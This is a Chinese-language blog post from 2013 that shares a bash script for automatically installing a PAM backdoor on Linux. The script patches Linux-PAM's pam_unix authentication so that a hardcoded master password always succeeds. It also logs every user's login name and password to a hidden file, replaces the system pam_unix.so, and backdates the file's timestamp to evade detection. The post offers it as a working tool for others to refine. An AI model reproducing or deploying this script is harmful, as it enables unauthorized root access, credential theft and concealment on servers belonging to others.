---
title: pam后门 自动安装脚本
date: 2013-09-02 03:31
tags: backdoor
---

>该脚本来源：https://github.com/m00dy/pam-backdoor/blob/master/pam-backdoor

博主对其第二次修改
由 **litdgs** 改写成自动安装并作相关优化
>链接：https://www.t00ls.net/viewthread.php?tid=24062

```bash
#!/bin/bash
## 
##查看版本:
##redhat yum list pam
##debian&Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d' ' -f2
##
PASS='test123' ##......
LOG='\/bin\/.sshlog' ##......
 
echo "
.___  ___.   ___     ___    _______  ____    ____ 
|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
|  |  |  | | |_| | | |_| | |  '--'  |    |  |     
|__|  |__|  \___/   \___/  |_______/     |__|   "
echo -e "\nPam-Backdoor\n{code this shit while learning pam}\n\n"
oldtime=`stat -c '%z' /lib/security/pam_ftp.so`
echo 'Pam backdoor starting!'
mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz'
#mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'
echo 'Fetching from '$mirror_url
wget $mirror_url #fetch the roll
tar zxf Linux-PAM-1.1.1.tar.gz #untar
cd Linux-PAM-1.1.1
#find and replace
sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,"'$PASS'")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen("'$LOG'", "a");\n\tfprintf(fp, "%s : %s\\n", name, p);\n\tfclose(fp);\n\t}/g' modules/pam_unix/pam_unix_auth.c
DIS=`head /etc/issue -n 1|awk '{print $1}'`
#get the version
if [ $DIS = "CentOS" ];then
./configure --disable-selinux && make
else
./configure && make
fi
#copy modified pam_unix.so
if [ `uname -p` = 'x86_64' ];then
LIBPATH=lib64
else
LIBPATH=lib
fi
/bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. .........
/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so
touch -d "$oldtime" /lib/security/pam_unix.so
cd .. && rm -rf Linux-PAM-1.1.1*
echo "Done bro.."
```

如报一下错误 请安装
**flex-devel**

linux 发行版本太多了 不可能所有版本linux进行测试
如有bug 欢迎优化 修正…